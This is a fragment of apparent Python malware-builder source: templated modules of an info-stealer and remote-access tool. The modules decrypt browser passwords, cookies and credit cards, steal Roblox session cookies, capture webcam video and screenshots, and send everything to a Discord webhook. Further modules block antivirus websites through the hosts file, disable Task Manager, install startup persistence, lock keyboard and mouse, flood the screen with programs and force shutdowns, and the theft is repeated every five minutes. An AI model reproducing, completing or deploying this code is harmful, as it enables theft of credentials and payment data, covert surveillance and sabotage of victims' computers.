            cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue

                url = f"- [+] |URL|: {row[0]}"
                username = f"   |USERNAME|: {row[1]}"
                password = f"   |PASSWORD|: {self.decrypt_password(row[2], self.master_key)}"
                __LOGINS__.append(Types.Login(url, username, password))

            conn.close()
            os.remove('login_db')

        def get_cookies(self, path: str, profile: str):
            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
            if not os.path.exists(cookie_db):
                return

            try:
                shutil.copy(cookie_db, 'cookie_db')
                conn = sqlite3.connect('cookie_db')
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue
                    url = f"- [+] |URL|: {row[0]}"
                    name = f"  |NAME|: {row[1]}"
                    path = f"  |PATH|: {row[2]}"
                    cookie = f"  |COOKIE|: {self.decrypt_password(row[3], self.master_key)}"
                    expire = f"  |EXPIRE|: {row[4]}"

                    __COOKIES__.append(Types.Cookie(url, name, path, cookie, expire))
                conn.close()
            except:
                pass

            os.remove('cookie_db')

        def get_web_history(self, path: str, profile: str):
            web_history_db = f'{path}\\{profile}\\History'
            if not os.path.exists(web_history_db):
                return

            shutil.copy(web_history_db, 'web_history_db')
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url = f"- [+] |URL|: {row[0]}"
                title = f"  |TITLE|: {row[1]}"
                time = f"  |TIME|: {row[2]}"
                __WEB_HISTORY__.append(Types.WebHistory(url, title, time))

            conn.close()
            os.remove('web_history_db')

        def get_downloads(self, path: str, profile: str):
            downloads_db = f'{path}\\{profile}\\History'
            if not os.path.exists(downloads_db):
                return

            shutil.copy(downloads_db, 'downloads_db')
            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                
                path = f"- [+] |PATH|: {row[1]}"
                url = f"  |URL|: {row[0]}"
                __DOWNLOADS__.append(Types.Download(path, url))

            conn.close()
            os.remove('downloads_db')

        def get_credit_cards(self, path: str, profile: str):
            cards_db = f'{path}\\{profile}\\Web Data'
            if not os.path.exists(cards_db):
                return

            shutil.copy(cards_db, 'cards_db')
            conn = sqlite3.connect('cards_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                name = f"- [+] |NAME|: {row[0]}"
                expiration_month = f"  |EXPIRATION MOUNTH|: {row[1]}"
                expiration_year = f"  |EXPIRATION YEAR|: {row[2]}"
                card_number = f"  |CARD NUMBER|: {self.decrypt_password(row[3], self.master_key)}"
                date_modified = f"  |DATE MODIFIED|: {row[4]}"
                __CARDS__.append(Types.CreditCard(name, expiration_month, expiration_year, card_number, date_modified))

            conn.close()
            os.remove('cards_db')


    class Types:
        class Login:
            def __init__(self, url, username, password):
                self.url = url
                self.username = username
                self.password = password

            def __str__(self):
                return f'{self.url}\t{self.username}\t{self.password}'

            def __repr__(self):
                return self.__str__()

        class Cookie:
            def __init__(self, host, name, path, value, expires):
                self.host = host
                self.name = name
                self.path = path
                self.value = value
                self.expires = expires

            def __str__(self):
                return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

            def __repr__(self):
                return self.__str__()

        class WebHistory:
            def __init__(self, url, title, timestamp):
                self.url = url
                self.title = title
                self.timestamp = timestamp

            def __str__(self):
                return f'{self.url}\t{self.title}\t{self.timestamp}'

            def __repr__(self):
                return self.__str__()

        class Download:
            def __init__(self, tab_url, target_path):
                self.tab_url = tab_url
                self.target_path = target_path

            def __str__(self):
                return f'{self.tab_url}\t{self.target_path}'

            def __repr__(self):
                return self.__str__()

        class CreditCard:
            def __init__(self, name, month, year, number, date_modified):
                self.name = name
                self.month = month
                self.year = year
                self.number = number
                self.date_modified = date_modified

            def __str__(self):
                return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

            def __repr__(self):
                return self.__str__()
            
    Br0w53r(w3bh00k_ur1)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R0b10xC00ki3 = r'''
def R0b10x_C00ki3():
    def g3t_c00ki3_4nd_n4vig4t0r(br0ws3r_functi0n):
        try:
            c00kie5 = br0ws3r_functi0n()
            c00kie5 = str(c00kie5)
            c00kie = c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            n4vigator = br0ws3r_functi0n.__name__
            return c00kie, n4vigator
        except:
            return None, None

    def Edg3():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Chr0m3():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def F1r3f0x():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Op3r4():
        return browser_cookie3.opera(domain_name="roblox.com")

    def S4f4r1():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Br4v3():
        return browser_cookie3.brave(domain_name="roblox.com")

    br0ws3r5 = [Edg3, Chr0m3, F1r3f0x, Op3r4, S4f4r1, Br4v3]
    for br0ws3r in br0ws3r5:
        c00ki3, n4vigator = g3t_c00ki3_4nd_n4vig4t0r(br0ws3r)
        if c00ki3:
            try:
                inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": c00ki3})
                d4t4 = json.loads(inf0.text)
            except:
                pass

            try:
                us3rn4m3_r0b10x = d4t4['UserName']
            except:
                us3rn4m3_r0b10x = "None"

            try:
                us3r_1d_r0b10x = d4t4["UserID"]
            except:
                us3r_1d_r0b10x = "None"

            try:
                r0bux_r0b10x = d4t4["RobuxBalance"]
            except:
                r0bux_r0b10x = "None"

            try:
                pr3mium_r0b10x = d4t4["IsPremium"]
            except:
                pr3mium_r0b10x = "None"

            try:
                av4t4r_r0b10x = d4t4["ThumbnailUrl"]
            except:
                av4t4r_r0b10x = avatar_embed

            try:
                bui1d3r5_c1ub_r0b10x = d4t4["IsAnyBuildersClubMember"]
            except:
                bui1d3r5_c1ub_r0b10x = "None"
    
            size_c00ki3 = len(c00ki3)
            middle_c00ki3 = size_c00ki3 // 2
            c00ki3_part1 = c00ki3[:middle_c00ki3]
            c00ki3_part2 = c00ki3[middle_c00ki3:]

            client = SyncWebhook.from_url(w3bh00k_ur1)

            embed = discord.Embed(
                title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
                color=color_embed
            )
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            embed.set_thumbnail(url=av4t4r_r0b10x)
            embed.add_field(name=":compass: | Navigator:", value=f"```{n4vigator}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: | Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
            embed.add_field(name=":robot: | Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
            embed.add_field(name=":moneybag: | Robux:", value=f"```{r0bux_r0b10x}```", inline=True)
            embed.add_field(name=":tickets: | Premium:", value=f"```{pr3mium_r0b10x}```", inline=True)
            embed.add_field(name=":construction_site: | Builders Club:", value=f"```{bui1d3r5_c1ub_r0b10x}```", inline=True)
            embed.add_field(name=":cookie: | Cookie Part 1:", value=f"```{c00ki3_part1}```", inline=False)
            embed.add_field(name=":cookie: | Cookie Part 2:", value=f"```{c00ki3_part2}```", inline=False)

            client.send(embed=embed, username=username_embed,
                              avatar_url=avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

C4m3r4C4ptur3 = r'''
def C4m3r4_C4ptur3():
    try:
        from datetime import datetime
        name_file_capture = f"CameraCapture_{username_pc}.avi"
        time_capture = 10
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            Clear()
            return

        def c4ptur3(path_file_capture):
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
            time_start = datetime.now()
            Clear()
            while (datetime.now() - time_start).seconds < time_capture:
                Clear()
                ret, frame = cap.read()
                if not ret:
                    Clear()
                    break
                out.write(frame)

            cap.release()
            out.release()
            Clear()

        try:
            path_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_capture}"
            c4ptur3(path_file_capture)
        except:
            path_file_capture = name_file_capture
            c4ptur3(path_file_capture)

        embed = Embed(title=f"Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
        embed.set_footer(text=footer_text, icon_url=avatar_embed)

        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        with open(path_file_capture, "rb") as f:
            w3bh00k.send(
                embed=embed,
                file=File(f, filename=name_file_capture),
                username=username_embed,
                avatar_url=avatar_embed
            )
            
        if os.path.exists(path_file_capture):
            os.remove(path_file_capture)
        Clear()
    except:
        Clear()
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Op3nU53rPr0fi1353tting5 = r'''
def Op3n_U53r_Pr0fi13_53tting5():
    try:
        subprocess.Popen(["control", "userpasswords2"])
        time.sleep(2)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Scr33n5h0t = r'''
def Scr33n5h0t():
    try:
        name_file_screen = f"Screenshot_{username_pc}.png"

        def capture(path):
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            image.save(path)
        
        try:
            path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_screen}"
            capture(path_file_screen)
        except:
            path_file_screen = name_file_screen
            capture(path_file_screen)

        embed = Embed(title=f"Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
        embed.set_image(url=f"attachment://{name_file_screen}")
        embed.set_footer(text=footer_text, icon_url=avatar_embed )
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        w3bh00k.send(
                embed=embed,
                file=File(f'{path_file_screen}', filename=name_file_screen),
                username=username_embed,
                avatar_url=avatar_embed
            )

        if os.path.exists(path_file_screen):
            os.remove(path_file_screen)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckW3b5it3 = r'''
def B10ck_W3b5it3():
    "Perm Admin Required"
    try:
        d1r3ct0ry = os.getcwd()
        d15k_l3tt3r = os.path.splitdrive(d1r3ct0ry)[0]

        def b10ck_w3b5it3(website):
            hosts_path = f"{d15k_l3tt3r}\\Windows\\System32\\drivers\\etc\\hosts"
            if os.path.exists(hosts_path):
                pass
            else:
                hosts_path = f"C:\\Windows\\System32\\drivers\\etc\\hosts"

            redirect = "127.0.0.1"
            with open(hosts_path, "a") as file:
                file.write("\n" + redirect + " " + website)
        
        w3b51t35_t0_8l0ck = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for w3b51t3 in w3b51t35_t0_8l0ck:
            b10ck_w3b5it3(w3b51t3)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rtup = r'''
def St4rtup():
    try:
        file_path = os.path.abspath(sys.argv[0])

        if file_path.endswith(".exe"):
            ext = "exe"
        elif file_path.endswith(".py"):
            ext = "py"

        new_name = f"ㅤ.{ext}"

        if sys.platform.startswith('win'):  
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        path_new_file = os.path.join(folder, new_name)

        shutil.copy(file_path, path_new_file)
        os.chmod(path_new_file, 0o777) 
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rt = r'''
payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)
try: B10ck_K3y()
except: pass
try: B10ck_T45k_M4n4g3r()
except: pass
try: B10ck_W3b5it3()
except: pass
try: St4rtup()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: Shutd0wn()
except: pass
payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)

try: F4k3_3rr0r()
except: pass
try: Sp4m_0p3n_Pr0gr4m()
except: pass
try: B10ck_M0u53()
except: pass

Clear()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R3st4rt = r'''
while True:
    time.sleep(300)

    payload = {
    'content': f'****╔════════════════════Injection═══════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(w3bh00k_ur1, json=payload)
    try: B10ck_K3y()
    except: pass
    try: B10ck_T45k_M4n4g3r()
    except: pass
    try: B10ck_W3b5it3()
    except: pass
    try: Sy5t3m_Inf0()
    except: pass
    try: C4m3r4_C4ptur3()
    except: pass
    try: Scr33n5h0t()
    except: pass
    try: Di5c0rd_T0k3n()
    except: pass
    try: Br0w53r_5t341()
    except: pass
    try: R0b10x_C00ki3()
    except: pass
    try: Shutd0wn()
    except: pass

    Clear()
    payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(w3bh00k_ur1, json=payload)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

def F4k33rr0r(title, message):
    F4k33rr0r = f'''
def F4k3_3rr0r():
    messagebox.showerror("{title}", "{message}")
'''
    return F4k33rr0r

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Shutd0wn = r'''
def Shutd0wn():
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4m0p3nPr0gr4m = r'''
def Sp4m_0p3n_Pr0gr4m():
    def sp4m():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=sp4m)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    while True:
        request()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckK3y = r'''
def B10ck_K3y():
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def Unb10ck_K3y():
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckT45kM4n4g3r = r'''
def B10ck_T45k_M4n4g3r():
    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
    Clear()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckM0u53 = r'''
def B10ck_M0u53():
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

    while True:
        try:
            B10ck_M0u53()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass
'''

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝